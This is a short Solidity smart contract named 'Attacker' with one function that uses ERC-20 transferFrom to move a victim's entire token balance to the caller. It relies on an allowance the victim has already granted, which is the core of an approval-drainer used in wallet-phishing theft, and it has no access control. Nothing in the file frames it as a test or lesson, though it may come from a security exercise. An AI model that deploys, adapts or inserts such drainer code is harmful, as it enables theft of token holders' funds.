// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Attacker {

    function attack(address _victim, address _token) external {
        IERC20(_token).transferFrom(_victim, msg.sender, IERC20(_token).balanceOf(_victim));
    }

}